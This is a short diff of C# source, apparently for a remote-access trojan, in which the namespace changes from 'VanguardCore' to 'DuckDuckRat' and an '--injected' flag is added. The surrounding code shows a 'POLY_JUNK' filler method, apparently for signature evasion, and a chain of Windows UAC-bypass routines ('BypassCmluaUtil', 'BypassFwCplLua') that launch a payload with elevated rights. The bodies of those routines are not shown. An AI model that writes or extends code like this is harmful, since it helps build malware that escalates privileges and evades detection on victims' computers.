@@ -7,12 +7,12 @@ using System.Threading;
 using System.Collections.Generic;
 using Microsoft.Win32;
 
-namespace VanguardCore
+namespace DuckDuckRat
 {
     public class ElevationService
     {
         // [POLY_JUNK]
-        private static void _vanguard_bf418391() {
+        private static void _DuckDuckRat_bf418391() {
             int val = 48510;
             if (val > 50000) Console.WriteLine("Hash:" + 48510);
         }
@@ -345,7 +345,7 @@ namespace VanguardCore
             }
             DoBehavioralReputation();
             string evName = $"Global\\{Guid.NewGuid():B}";
-            string args = $"--uac-child --event={evName} --rnd={Guid.NewGuid().ToString().Substring(0, 6)}";
+            string args = $"--injected --uac-child --event={evName} --rnd={Guid.NewGuid().ToString().Substring(0, 6)}";
             
             if (BypassCmluaUtil(payloadPath, args, evName)) return true;
             if (BypassFwCplLua(payloadPath, args)) return true;
@@ -379,3 +379,5 @@ namespace VanguardCore
         }
     }
 }
+
+
